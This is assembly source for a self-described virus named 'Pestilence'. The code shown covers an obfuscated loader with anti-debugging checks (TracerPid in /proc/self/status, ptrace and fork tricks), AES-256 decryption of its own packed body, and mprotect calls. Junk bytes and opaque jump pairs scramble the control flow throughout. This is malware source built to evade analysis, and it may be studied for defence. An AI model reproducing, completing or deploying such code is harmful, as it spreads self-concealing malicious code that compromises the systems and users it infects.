; REGISTERS : %m6, %m7, %m8, %vsp
; Do not touch those registers as they contain sensitive data
; about different memory pages addresses.

%include "inc.asm"

DEFAULT rel
GLOBAL _start

SECTION .text

    nop
_start:
    nop
    call        _virus

align 16
_signature:
    .start: db "Pestilence version 1.0 (c)oded by mamaurai:xchalle - "
    .startsize: equ $-.start
    .index: times 0x4 db 0x30
    db ':'
    .key_preview: times 0x8 db 0x30
    db 0x00
align 16
_eos:

;- GLOBAL variables ----------------------------------
signature_len: equ _eos-_signature
non_packed_len: equ _packed-_start
virus_len: dd 0x00000000
entrypoint: dq 0x0000000000000000
;-----------------------------------------------------
; PUBLIC PART (This part isn't encrypted or packed).
_public:
;-----------------------------------------------------
; Public Structures (Structures used by public
; functions).
struc _AESD_OFF
    .key_exp    resb 0x100
    .startaddr  resq 0x1
    .length     resq 0x1
    .keyaddr    resq 0x1
endstruc
struc _UEC_OFF
    .mapaddr    resq 0x1
    .key        resb 0x20
endstruc
;-----------------------------------------------------
; Public Preprocessor Values.
tracerline_size: equ 11
columns_size: equ 7
lines_size: equ 5
debugging_size: equ 23
keycreation_len: equ _decrypt-_virus
;-----------------------------------------------------
; Public Variables.
VARIABLES public
columns:        db "COLUMNS", 0x0
lines:          db "LINES", 0x0
procself:       db "/proc/self/status", 0x0
tracerline:     db "TracerPid:", 0x9
debugging:      db "[DEBUGGER IS RUNNING..]"
non_encrypted_len: equ _decrypt-_start
key: times 32 db 0x00
;-----------------------------------------------------
; Public code.
;-----------------------------------------------------
_virus:
    jmp         ..@w1lAQSAUDnec
..@LJBeyXqXPezy:
    jz          ..@koUslAyD8iQL
    jmp         ..@yNLY9tJTPaYn
..@aE7mTHNOciA0:
%ifndef ENABLE_DEBUGGING
    cmp         eax, 0x3
    jl          ..@U0mCDDKvwwB0
%endif
    jmp         $+4
db 0x8b, 0x5e
    jl          ..@JETBH1qE9WbH
    jge         ..@JETBH1qE9WbH
..@b4tiX6Km53r7:
    jmp         UnpackExecutableCode
..@nssAFeLdFwWC:
    movdqu      OWORD [rsp+0x20],xmm0
    jmp         ..@mP1PVd430YYd
..@KQ0oCKCML4MZ:
%ifndef ENABLE_DEBUGGING
    add         rsp, 0x1000
%endif
    jmp         $+5
db 0xf6, 0x20, 0x3d
    jl          ..@20A7072c8GHE
    jge         ..@20A7072c8GHE
..@Pcckg8UeSL5T:
    movdqa      OWORD [rsi+0x90], xmm3
    aeskeygenassist xmm2, xmm3, 0x10
    call        ..@ghdqv9nxe3Sd
    jmp         $+3
db 0xaf
    jmp         ..@afFmgNXEbIgA
..@j1IWsOQajP89:
    movdqa      xmm4, xmm3
    js          ..@wKNUhqBcnJAV
    jns         ..@wKNUhqBcnJAV
..@TRzMf0iAPQIV:
%ifndef ENABLE_DEBUGGING
    mov         r1, rsp
%endif
    jmp         $+3
db 0x58
    jmp         ..@INtMuRhTpF8h
..@O5FXnfqjN7Zz:
    mov         rax, SYS_FORK
    jmp         $+4
db 0x5b, 0xba
    jmp         ..@VNDOh684IwHq
..@OpXslDHj5HIV:
    add         r1, 1
    js          ..@lVZi0fbNV6DG
    jns         ..@lVZi0fbNV6DG
..@6xHcgV0Ao1ld:
    leave
    jmp         $+3
db 0xc4
    jb          ..@3bzDuexa61T2
    jae         ..@3bzDuexa61T2
..@ZhY4TmZUg0AD:
    movdqu      OWORD [rsp+0xd0],xmm0
    js          ..@7fZnDej3bph2
    jns         ..@7fZnDej3bph2
..@HGpesmaqAvPH:
    xor         r4, r4
    mov         rax, SYS_WAIT4
    syscall
    jmp         $+4
db 0xd9, 0xa7
    jmp         $+4
db 0xbb, 0x11
    jmp         $+3
db 0x74
    jmp         $+5
db 0x6c, 0xff, 0x8d
    jmp         $+3
db 0xc2
    jl          ..@pglEGH1ylmkC
    jge         ..@pglEGH1ylmkC
..@CIGfqG19Dumm:
    mov         rsi, QWORD [rsp+1*bytes]
    jmp         $+5
db 0x0c, 0x6c, 0x58
    jmp         $+5
db 0xdd, 0xf2, 0xda
    jmp         ..@8uovCKFyPyx8
..@POk3g8NKitSs:
    cmp         BYTE [r2], al
    jmp         $+4
db 0xfb, 0xed
    jmp         ..@y0Z5vrjeVwiR
..@faOdOqCofJOK:
    xor         rax, rax
    jmp         $+4
db 0x6b, 0xa5
    jmp         $+4
db 0xe4, 0x6f
    jmp         $+3
db 0x29
    jmp         $+4
db 0x42, 0x31
    jmp         $+5
db 0xb2, 0x34, 0xc4
    jb          ..@eZY8A4aj9xIg
    jae         ..@eZY8A4aj9xIg
..@vrOY2lNHvLsH:
    and         rsp, 0xfffffffffffffff0
    jmp         $+4
db 0x69, 0x6b
    jmp         $+5
db 0x1c, 0x30, 0xaa
    js          ..@sTcAjkVk8c2Q
    jns         ..@sTcAjkVk8c2Q
..@y0Z5vrjeVwiR:
    je          ..@OpXslDHj5HIV
    jmp         $+4
db 0x8f, 0x11
    jmp         $+3
db 0x35
    je          ..@xu0ZRCXrbHsF
    jne         ..@xu0ZRCXrbHsF
..@Gd8NteHkBfBQ:
    add         rax, 1
    jmp         $+5
db 0x5a, 0x2a, 0x1f
    jmp         $+3
db 0x3f
    jmp         $+5
db 0x8e, 0xa2, 0x5d
    jmp         ..@R7lf7sT541ym
..@WF5FS83ZERax:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         r1, 16
%endif
%endif
    jmp         $+3
db 0x3d
    jmp         $+5
db 0xc8, 0x1d, 0x9f
    jmp         ..@sV1diiaFlnsd
..@xhRrjLrHbQiF:
    aesdec      xmm0, xmm1
    jmp         $+3
db 0x98
    jmp         ..@i3P6kS5w1odf
..@lzSNbY80uJzj:
    aeskeygenassist xmm2, xmm1, 0x0
    jmp         $+4
db 0xf8, 0x1d
    jmp         $+3
db 0x93
    jmp         ..@hdE451MDN6Yk
Aes256KeyCreation:
    jmp         ..@yCD55ZKfOen3
..@OYZO6607zws6:
    aesimc      xmm0,xmm1
    js          ..@Kk1bR55nTDPo
    jns         ..@Kk1bR55nTDPo
..@NDoFYWjGJE92:
    xor         rax, rax
    jmp         $+4
db 0xde, 0x40
    jmp         $+4
db 0x22, 0xbe
    jmp         $+5
db 0x42, 0x15, 0x44
    jmp         $+5
db 0xcf, 0x13, 0xd6
    jl          ..@O5FXnfqjN7Zz
    jge         ..@O5FXnfqjN7Zz
..@sV1diiaFlnsd:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         r2, rax
%endif
%endif
    jmp         ..@vJrfnU0Jh3Y9
..@ybyLmOlGypUa:
    ret
    jmp         $+5
db 0x99, 0x14, 0xe3
    jmp         $+5
db 0x0b, 0xa0, 0xc5
    jb          Strncmp
    jae         Strncmp
..@e3Gf6wN7FDWz:
%ifndef ENABLE_DEBUGGING
    jne         ..@7so1W3g3y4yv
%endif
    jmp         $+5
db 0x5a, 0x04, 0x96
    jmp         $+3
db 0x5b
    jl          ..@KQ0oCKCML4MZ
    jge         ..@KQ0oCKCML4MZ
..@zrJPWKrbUoFX:
    movdqu      OWORD [rsp+0xc0],xmm0
    jmp         ..@2uTgX6WNga7y
..@oBtpwNJIvsf1:
    movdqu      xmm1, OWORD [rsp+0x50]
    jmp         ..@wf7wZx0th1V7
..@HUxLjGqA2CB5:
    jnz         ..@eZY8A4aj9xIg
    jmp         $+4
db 0xe8, 0x74
    je          ..@OQXnD4IyYrhY
    jne         ..@OQXnD4IyYrhY
..@WgdPYIPVvWPU:
    aesimc      xmm0,xmm1
    jmp         $+4
db 0x80, 0x06
    jmp         $+5
db 0xa2, 0x15, 0x92
    je          ..@TPN9PqEUP8yA
    jne         ..@TPN9PqEUP8yA
..@aOWVdUNIkFW8:
    aesimc      xmm0,xmm1
    jmp         $+3
db 0x31
    jmp         $+5
db 0xfc, 0xc0, 0xf4
    jb          ..@nssAFeLdFwWC
    jae         ..@nssAFeLdFwWC
..@iDumvCpjTUg3:
%ifndef ENABLE_DEBUGGING
    test        rax, rax
%endif
    jmp         $+4
db 0x8b, 0xd1
    jmp         $+5
db 0xf7, 0xc2, 0x32
    jmp         $+5
db 0xea, 0xd5, 0xe7
    js          ..@OrmvIwGZUh4P
    jns         ..@OrmvIwGZUh4P
..@77tddABsm01j:
    mov         rdi, QWORD [rsp+_AESD_OFF.keyaddr]
    call        Aes256KeyExpansion
    xor         rcx, rcx
    jmp         ..@eUZnWXdHwECy
..@ftk9SOFipnTw:
    add         r2, r4
    jl          ..@YUsABHtNw36i
    jge         ..@YUsABHtNw36i
..@S89Rum6c7V5J:
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp]
    aesdeclast  xmm0, xmm1
    jmp         ..@a8QKbOnMEYjT
..@751VUAZ9awVE:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    cmp         rax, 0x00
    jle         ..@U0mCDDKvwwB0
%endif
%endif
    js          ..@xuZ3tZKRJDie
    jns         ..@xuZ3tZKRJDie
..@wf7wZx0th1V7:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x50],xmm0
    jmp         ..@5auWlHIaQ9PM
..@2PrZRfAkt5HI:
    DESTROY_MX_VAR
    mov         rax, SYS_EXIT
    syscall
    jmp         AntiDebugging
..@FNtLOMNC9KAe:
    cmp         DWORD [r5], 0x00000000
    jmp         $+4
db 0x4f, 0x97
    jmp         $+4
db 0x6a, 0x48
    jmp         ..@cdDrMPnactcn
..@GG8OgQHVMH8G:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    and         rax, 0xff00
    shr         eax, 8
%endif
%endif
    jmp         $+5
db 0xfe, 0x2b, 0x7a
    jl          ..@cewnZAAM5xuU
    jge         ..@cewnZAAM5xuU
..@Fqj9bjlUUjEI:
    mov         r1, r5
    jl          ..@ptdT7aFSU9CQ
    jge         ..@ptdT7aFSU9CQ
..@cewnZAAM5xuU:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    add         rsp, bytes
%endif
%endif
    jmp         $+4
db 0x6a, 0x7c
    jb          ..@9TJ7Lstb9zxn
    jae         ..@9TJ7Lstb9zxn
..@2uTgX6WNga7y:
    movdqu      xmm1, OWORD [rsp+0xd0]
    jl          ..@pw6gTeySTFrz
    jge         ..@pw6gTeySTFrz
..@XUuxQs5MnkBG:
    sub         QWORD [rsp+2*bytes], rdx
    jb          ..@Z9ueMDZqVfUj
    jae         ..@Z9ueMDZqVfUj
..@dyO26NAUcrJ2:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x90],xmm0
    jmp         ..@wSxgCGyGvjD7
..@50uAxpc4IwBb:
    GGLOBAL     entrypoint
    cmp         QWORD [r5], 0x0000000000000000
    jmp         ..@m3Cv27gSMzCp
..@7so1W3g3y4yv:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    jmp         $+3
db 0x1c
    jmp         ..@QYBqHJfM9TLf
..@RDEKCHUr8Dza:
    and         r5, PAGE_SIZE-1
    jmp         $+5
db 0x77, 0x0e, 0x48
    jmp         ..@bEHP0kLWFBeO
..@VNDOh684IwHq:
    syscall
    jmp         $+4
db 0xab, 0xca
    je          ..@R16kFDmbI166
    jne         ..@R16kFDmbI166
..@wOyqQ25gX3nd:
    mov         m4, rdi
    js          ..@LGvXO22j3awT
    jns         ..@LGvXO22j3awT
..@83zp4709kXuw:
    movdqu      xmm1, OWORD [rsp+0xe0]
    jb          ..@CbxlRenqKGjC
    jae         ..@CbxlRenqKGjC
Aes256Decryption:
    jmp         ..@FCybMXcMHG8L
..@oBtvAqz8ICcu:
    INIT_MX_VAR
    jmp         $+4
db 0x2b, 0x51
    jmp         ..@Qh6cRdbNeNY4
..@qrPXEujPmVR3:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         r1, rax
    mov         r2, rsp
    xor         r3, r3
%endif
%endif
    jl          ..@RoIlnOfM8RKv
    jge         ..@RoIlnOfM8RKv
Strlen:
    jmp         ..@EdEu1Joe7IYv
..@uiiNhVsx60Jz:
    ret
    jmp         Memmem
..@0mdn3nIoEvlS:
    pxor        xmm3, xmm2
    ret
    jmp         $+4
db 0x67, 0xae
    jmp         Aes256Decryption
..@ROD0oNeVNUpK:
    aeskeygenassist xmm2, xmm3, 0x4
    call        ..@ghdqv9nxe3Sd
    jb          ..@7LkLPto9ViN9
    jae         ..@7LkLPto9ViN9
..@MdAykmpWAGYx:
    call        ..@ghdqv9nxe3Sd
    jmp         $+5
db 0x5d, 0x8c, 0x03
    js          ..@2UHX1YCCGTdb
    jns         ..@2UHX1YCCGTdb
..@mcuDg4cLcb6n:
    movdqa      OWORD [rsi+0x50], xmm3
    jl          ..@ROD0oNeVNUpK
    jge         ..@ROD0oNeVNUpK
..@HZTWxPtcVddi:
%ifndef ENABLE_DEBUGGING
    mov         r1, r5
    call        GetEnv
%endif
    jmp         $+5
db 0xac, 0x7d, 0x9f
    jb          ..@iDumvCpjTUg3
    jae         ..@iDumvCpjTUg3
..@q4CEAXXQdlIn:
    pxor        xmm1, xmm2
    je          ..@SqTl9xAvor8u
    jne         ..@SqTl9xAvor8u
..@MYH6NCwy3zJn:
    test        eax, eax
    jmp         ..@LJBeyXqXPezy
..@GTJG3uXXhMXD:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    jz          ..@95Q1lQx4nCgx
%endif
%endif
    jmp         $+5
db 0x55, 0xc7, 0xec
    jmp         $+5
db 0x8d, 0x27, 0xa5
    jmp         $+3
db 0x67
    jmp         $+4
db 0x64, 0xb9
    jmp         ..@Dum2GxPHMz8u
..@M5LOse6L33fi:
%ifndef ENABLE_DEBUGGING
    mov         r3, r5
    mov         r4, tracerline_size
%endif
    jl          ..@3LsRj8u1WlLO
    jge         ..@3LsRj8u1WlLO
..@0XJ8RiOGM7Uc:
    VAR         public, entrypoint
    jb          ..@OUZ9EJJ1bHAe
    jae         ..@OUZ9EJJ1bHAe
..@ODs9WMdUNJCC:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    jnz         ..@U0mCDDKvwwB0
    mov         rax, SYS_GETPPID
%endif
%endif
    jmp         ..@qWvggIJKgEd4
GetEnv:
    jmp         ..@4M14N5ISTT3f
..@qjNVbjKL4JCb:
    add         rax, 0x20
    cmp         rax, QWORD [rsp]
    jl          ..@M5uKy9VyeuLr
    jmp         $+4
db 0x3b, 0x70
    jmp         $+5
db 0xef, 0x72, 0x4e
    jmp         $+3
db 0x49
    jb          ..@TLIw0UOqCjJl
    jae         ..@TLIw0UOqCjJl
..@4iUfmVlC1v3G:
%ifndef ENABLE_DEBUGGING
    mov         r2, r5
%endif
    jl          ..@CgcL7w0aui2w
    jge         ..@CgcL7w0aui2w
..@0pxhE4o8MCb3:
    pxor        xmm3, xmm4
    pslldq      xmm4, 0x4
    pxor        xmm3, xmm4
    jmp         $+4
db 0x6a, 0x9c
    jmp         ..@0mdn3nIoEvlS
..@i7pl1PTBzvHD:
    push        r3
    movdqu      xmm0, OWORD [r1]
    jmp         $+4
db 0x1e, 0x1f
    jmp         $+3
db 0x6a
    jmp         ..@zVOPFt2B6DFB
..@qJfwawBkXTAL:
%ifndef ENABLE_DEBUGGING
    VAR         public, lines
%endif
    jmp         $+5
db 0x66, 0xcb, 0x2d
    jl          ..@HZTWxPtcVddi
    jge         ..@HZTWxPtcVddi
..@V9G6OOk0ugFh:
    xor         r1, r1
    jb          ..@XxQvwFjeVmjp
    jae         ..@XxQvwFjeVmjp
..@0y9bEpjFe8cr:
    call        ..@kK1YSWDGYPTj
    jl          ..@mPS2pmyKXXIe
    jge         ..@mPS2pmyKXXIe
..@pKx84NQJdExV:
    mov         r1, r5
    jb          ..@0XJ8RiOGM7Uc
    jae         ..@0XJ8RiOGM7Uc
..@bbn2aZSqZI1f:
    movdqu      xmm3, [rdi+0x10]
    jmp         $+5
db 0xfa, 0xe3, 0x31
    jmp         ..@cZDHNhufXN86
..@koUslAyD8iQL:
    xor         rax, rax
    mov         rax, SYS_SETSID
    syscall
    jl          ..@NDoFYWjGJE92
    jge         ..@NDoFYWjGJE92
..@xuZ3tZKRJDie:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mov         rax, SYS_GETPPID
%endif
%endif
    jl          ..@nCvjPVJWYKz3
    jge         ..@nCvjPVJWYKz3
..@xvgrVpyf7DJx:
    rep         cmpsb
    jmp         $+5
db 0xe9, 0x24, 0x57
    jmp         ..@TK6gErQMlDFy
..@ghdqv9nxe3Sd:
    pshufd      xmm2, xmm2, 0xff
    jmp         $+5
db 0x2a, 0x37, 0x83
    jl          ..@2ytPslXWQ8NJ
    jge         ..@2ytPslXWQ8NJ
..@tATfcKMegOi1:
    mov         r3, rax
    jmp         ..@TzRvSUakhx9u
..@cibwAmQTw24F:
    cmp         QWORD [rdi], 0x00
    jmp         $+4
db 0x62, 0x53
    jmp         $+5
db 0xad, 0xc2, 0xf8
    jmp         ..@HXy96JTHEA9U
..@Se6VvH6TSznS:
    ret
    jmp         $+4
db 0x4a, 0xaa
    jmp         $+4
db 0x61, 0xe4
    jmp         Aes256KeyExpansion
..@IMWIaLV3Sj9o:
    xor         r4, r4
    xor         r5, r5
    jmp         rax
    js          ..@7so1W3g3y4yv
    jns         ..@7so1W3g3y4yv
..@MCtP7lzCltKg:
    xor         rax, rax
    jmp         $+3
db 0x2d
    jmp         $+4
db 0xa0, 0x46
    jmp         ..@qFNACayWkrvr
..@Cibm0bPcAcrV:
    movdqa      OWORD [rsi+0x20], xmm1
    js          ..@HjAm6GrFcvmH
    jns         ..@HjAm6GrFcvmH
..@3LsRj8u1WlLO:
%ifndef ENABLE_DEBUGGING
    call        Memmem
%endif
    jmp         ..@C1rzE0gb50zx
..@VaCTZUZPFiGz:
    push        r2
    push        r3
    push        r4
    jmp         $+3
db 0x28
    js          ..@pwdcGd77Va2N
    jns         ..@pwdcGd77Va2N
..@3O9IKtkh07ai:
    mov         rbp, rsp
    sub         rsp, _AESD_OFF_size+0x100
    jl          ..@vrOY2lNHvLsH
    jge         ..@vrOY2lNHvLsH
..@i3P6kS5w1odf:
    movdqu      xmm1, OWORD [rsp+0x50]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x40]
    jmp         ..@iNRVE439mUyT
..@Y9RNyyWx2XQm:
    add         rsp, 4*bytes
    jb          ..@ybyLmOlGypUa
    jae         ..@ybyLmOlGypUa
..@y2ihpZKjsCOd:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
%endif
%endif
    jb          ..@eOwLPTSZ28w1
    jae         ..@eOwLPTSZ28w1
..@blTC7rPkcG2l:
    test        r2, r2
    jmp         $+3
db 0xa8
    js          ..@oMOL7tJMz0F0
    jns         ..@oMOL7tJMz0F0
..@nCvjPVJWYKz3:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
%endif
%endif
    jl          ..@UZC4TfGOYpRR
    jge         ..@UZC4TfGOYpRR
..@rQkej9lPs49w:
    sub         rsp, _UEC_OFF_size
    jmp         ..@YATOZT2Qul2d
..@J2CG0REqTDVe:
    jz          ..@zKYMEEha9tOE
    js          ..@2rPbhLHNfggE
    jns         ..@2rPbhLHNfggE
..@tWOQHoyMD27o:
    cmp         BYTE [r1 + rax], 0x0
    jz          ..@uiiNhVsx60Jz
    jmp         $+5
db 0x83, 0xd9, 0x37
    jb          ..@Gd8NteHkBfBQ
    jae         ..@Gd8NteHkBfBQ
..@g87CWgNJ6xXG:
    call        Aes256KeyCreation
    jmp         $+5
db 0x28, 0xdc, 0x9c
    jmp         $+5
db 0xd3, 0x9c, 0x90
    jb          ..@uf8XTonBp4ga
    jae         ..@uf8XTonBp4ga
..@SXlPZq503JJG:
    jz          ..@FGlSRPoruYET
    or          r2, PAGE_SIZE-1
    jmp         $+3
db 0xcf
    jmp         $+5
db 0xff, 0x77, 0xd1
    js          ..@Zl5fy4GYHXxH
    jns         ..@Zl5fy4GYHXxH
..@nPaECzAtcqgG:
    mov         rcx, 0x8
    rep         movsd
    lea         r1, [rsp+_UEC_OFF.key]
    jl          ..@i2JXlct6g7Nw
    jge         ..@i2JXlct6g7Nw
..@sTcAjkVk8c2Q:
    mov         QWORD [rsp+_AESD_OFF.startaddr], r1
    jmp         $+3
db 0x58
    jmp         $+3
db 0xf0
    jb          ..@Vk8UpiAkXWGY
    jae         ..@Vk8UpiAkXWGY
..@hfgpfrM3rkLM:
    VAR         public, key
    mov         rsi, r5
    lea         rdi, [rsp+_UEC_OFF.key]
    jmp         $+5
db 0x8a, 0x1e, 0xfd
    jb          ..@nPaECzAtcqgG
    jae         ..@nPaECzAtcqgG
..@7LkLPto9ViN9:
    movdqa      OWORD [rsi+0x60], xmm1
    jb          ..@lzSNbY80uJzj
    jae         ..@lzSNbY80uJzj
..@R16kFDmbI166:
    test        eax, eax
    jz          ..@F1RXvgLMhQ4u
    xor         rdi, rdi
    jmp         $+5
db 0x60, 0xd1, 0xa9
    jb          ..@fxn02K0XhBtM
    jae         ..@fxn02K0XhBtM
..@PzOIXdltvDLW:
    je          ..@hfgpfrM3rkLM
    xor         r1, r1
    jl          ..@wydPfRqPRpPy
    jge         ..@wydPfRqPRpPy
..@uKNoOc4Ts3af:
    xor          r4, r4
    jmp         $+4
db 0xe0, 0x0b
    jmp         $+3
db 0x46
    jmp         ..@z7hMAGLbtoqU
..@F1RXvgLMhQ4u:
    jmp          DecryptExecutableCode
    jmp         $+3
db 0xb5
    jmp         $+4
db 0xd1, 0x57
    jmp         $+4
db 0x14, 0x3d
    jmp         $+3
db 0xda
    js          Strlen
    jns         Strlen
..@Z9ueMDZqVfUj:
    jmp         ..@JwtdZEA4mKYM
    jmp         ..@Ut3E6HAdl4YA
..@wydPfRqPRpPy:
    call        ExitProgram
    jmp         ..@hfgpfrM3rkLM
..@Qao8XQpuThER:
    movdqu      xmm3, OWORD [r2+rax+0x10]
    pxor        xmm0, xmm2
    pxor        xmm1, xmm3
    jmp         $+4
db 0xd6, 0x0d
    je          ..@qjNVbjKL4JCb
    jne         ..@qjNVbjKL4JCb
..@lXsYJgrYWZg6:
    and         r1, ~(PAGE_SIZE-1)
    mov         r4, r5
    jmp         $+4
db 0x18, 0xd5
    jmp         ..@IRYl8k3yegRj
..@1JzdDbPtpR0g:
    call        ExitProgram
    jmp         $+5
db 0x71, 0x66, 0x94
    jmp         ..@rQkej9lPs49w
Strncmp:
    jmp         ..@Z4NbZnLYNJr9
..@dbHnb8xj0GaN:
    aesdec      xmm0, xmm1
    jmp         $+3
db 0x2f
    jb          ..@RMwE6GPSJR8f
    jae         ..@RMwE6GPSJR8f
..@I8Gu9gXiLLVR:
    pslldq      xmm4, 0x4
    pxor        xmm1, xmm4
    pslldq      xmm4, 0x4
    jmp         $+5
db 0xc4, 0x92, 0x2e
    jmp         $+5
db 0xbf, 0xe4, 0x74
    jl          ..@mrjD7tE7p7Xf
    jge         ..@mrjD7tE7p7Xf
..@mZp8Bc9shzbj:
    xor         rax, rax
    jmp         ..@qjNVbjKL4JCb
    js          ..@M5uKy9VyeuLr
    jns         ..@M5uKy9VyeuLr
..@musegg8HsG1M:
%ifndef ENABLE_DEBUGGING
    RFILE       rax, [rsp], 0x200
    cmp         eax, 0x200
%endif
    je          ..@XPk77s7Q6ZZL
    jne         ..@XPk77s7Q6ZZL
..@6x1aYeGHrA1l:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         rax, rax
    mov         rax, SYS_FORK
%endif
%endif
    jmp         $+3
db 0x0c
    jmp         $+4
db 0xfc, 0x3d
    jb          ..@Wpp0WtNboOBN
    jae         ..@Wpp0WtNboOBN
..@zKYMEEha9tOE:
    mov         rax, r2
    pop         r1
    ret
    jb          Aes256KeyCreation
    jae         Aes256KeyCreation
..@qb6mIHr9tZYH:
    aesimc      xmm0,xmm1
    js          ..@zrJPWKrbUoFX
    jns         ..@zrJPWKrbUoFX
..@5auWlHIaQ9PM:
    movdqu      xmm1, OWORD [rsp+0x60]
    jmp         ..@WgdPYIPVvWPU
..@w1lAQSAUDnec:
    pop         rdi
    sub         rdi, 1
    sub         rdi, 0x5
    jb          ..@oBtvAqz8ICcu
    jae         ..@oBtvAqz8ICcu
..@FGlSRPoruYET:
    xor         rax, rax
    jl          ..@l2z0XuFk80DX
    jge         ..@l2z0XuFk80DX
..@C0aUX6g9fxwG:
    aesdec      xmm0, xmm1
    jmp         $+3
db 0x22
    je          ..@4sy46YPYsLkw
    jne         ..@4sy46YPYsLkw
..@8uovCKFyPyx8:
    mov         rcx, QWORD [rsp]
    cmp         QWORD [rsp+2*bytes], rcx
    jl          ..@Ut3E6HAdl4YA
    jmp         $+3
db 0x03
    jmp         $+4
db 0x7c, 0x99
    jl          ..@xvgrVpyf7DJx
    jge         ..@xvgrVpyf7DJx
..@5ODdDsBi85gS:
    pop         r2
    pop         r1
    ret
    jmp         GetEnv
..@pgZ1UBdIMUDW:
    mov         rdi, rbp
    jmp         $+5
db 0xd2, 0x06, 0x96
    jb          ..@IAebKFVjuZLL
    jae         ..@IAebKFVjuZLL
..@uf8XTonBp4ga:
    xor         r2, r2
    jmp         $+4
db 0xb7, 0xfa
    jmp         $+3
db 0xc5
    jmp         $+3
db 0x86
    jl          ..@gYgKf3HMBMYf
    jge         ..@gYgKf3HMBMYf
..@gYgKf3HMBMYf:
    GGLOBAL     _decrypt
    jmp         $+5
db 0x68, 0xba, 0x28
    jmp         $+4
db 0x56, 0xce
    jmp         $+4
db 0xf3, 0x9e
    jb          ..@2ty6oTLi8TDc
    jae         ..@2ty6oTLi8TDc
..@Z9OsZWWlV6E2:
    aesdec      xmm0, xmm1
    jl          ..@As9pn46rw2t2
    jge         ..@As9pn46rw2t2
..@VJ0bo4sMAJgj:
    jl          ..@7fZnDej3bph2
    jmp         $+5
db 0x24, 0xc1, 0x70
    jmp         ..@hS6typLwBiLW
..@20A7072c8GHE:
%ifndef ENABLE_DEBUGGING
    VAR         public, columns
    mov         r1, r5
%endif
    jmp         $+5
db 0xbc, 0x48, 0x99
    jmp         ..@h8l2C5aE4iJ4
..@l2z0XuFk80DX:
    mov         rax, SYS_MPROTECT
    syscall
    cmp         eax, 0x00
    jmp         $+3
db 0xa1
    jmp         $+3
db 0x00
    jmp         ..@PzOIXdltvDLW
..@z7hMAGLbtoqU:
%ifndef ENABLE_DEBUGGING
    sub         rsp, 0x1000
    VAR         public, procself
    OFILE       [r5], 0x0
%endif
    jl          ..@aE7mTHNOciA0
    jge         ..@aE7mTHNOciA0
..@2rPbhLHNfggE:
    add         r4, bytes
    jmp         ..@7kesANkRNuiN
..@bZeav854A2tC:
    movdqu      xmm1, OWORD [rsp+0xc0]
    jmp         $+5
db 0x6e, 0x55, 0x03
    jmp         $+3
db 0x66
    jl          ..@8rJsPDmZmjKD
    jge         ..@8rJsPDmZmjKD
..@zVOPFt2B6DFB:
    movdqu      xmm1, OWORD [r1+0x10]
    jl          ..@mZp8Bc9shzbj
    jge         ..@mZp8Bc9shzbj
..@lTdzFWMxXcRN:
    pslldq      xmm4, 0x4
    jmp         ..@0pxhE4o8MCb3
..@MwDp7hT8YrjF:
    xor         r2, r2
    jmp         ..@zKYMEEha9tOE
..@1RcsZbdsQ6eg:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    test        eax, eax
%endif
%endif
    jb          ..@GTJG3uXXhMXD
    jae         ..@GTJG3uXXhMXD
..@ZGlUZkBELNIR:
    movdqa      OWORD [rsi+0x80], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    call        ..@kK1YSWDGYPTj
    jb          ..@Pcckg8UeSL5T
    jae         ..@Pcckg8UeSL5T
..@Zl5fy4GYHXxH:
    add         r2, 1
    jmp         $+3
db 0x65
    jmp         $+4
db 0x33, 0xd3
    js          ..@FGlSRPoruYET
    jns         ..@FGlSRPoruYET
..@HjAm6GrFcvmH:
    aeskeygenassist xmm2, xmm1, 0x0
    call        ..@kK1YSWDGYPTj
    movdqa      OWORD [rsi+0x30], xmm3
    jl          ..@XcVhGlSQR4AR
    jge         ..@XcVhGlSQR4AR
..@h8l2C5aE4iJ4:
%ifndef ENABLE_DEBUGGING
    call        GetEnv
    test        rax, rax
    jnz         ..@7so1W3g3y4yv
%endif
    jmp         ..@qJfwawBkXTAL
..@2ty6oTLi8TDc:
    mov         r1, r5
    GGLOBAL     virus_len
    mov         r2d, DWORD [r5]
    js          ..@F0l42Seg0J1f
    jns         ..@F0l42Seg0J1f
..@cZDHNhufXN86:
    movdqa      OWORD [rsi], xmm1
    movdqa      OWORD [rsi+0x10], xmm3
    jmp         $+3
db 0xcc
    jb          ..@AM6XebsGCdGl
    jae         ..@AM6XebsGCdGl
..@F0l42Seg0J1f:
    sub         r2, non_encrypted_len
    and         r2, 0xfffffffffffffff0
    lea         r3, [rsp+_UEC_OFF.key]
    jmp         ..@MGzWcV9eO8jC
..@SqTl9xAvor8u:
    ret
    jmp         $+5
db 0x14, 0xca, 0x6e
    jmp         ..@kK1YSWDGYPTj
..@reiOQSL1Qh3U:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0xa0],xmm0
    movdqu      xmm1, OWORD [rsp+0xb0]
    jl          ..@4Cxg3Ehxgcds
    jge         ..@4Cxg3Ehxgcds
..@9TJ7Lstb9zxn:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    test        eax, eax
%endif
%endif
    jmp         $+5
db 0xc2, 0xc8, 0x79
    jmp         ..@QEImVP063wra
..@CbxlRenqKGjC:
    pxor        xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0xd0]
    aesdec      xmm0, xmm1
    jb          ..@bZeav854A2tC
    jae         ..@bZeav854A2tC
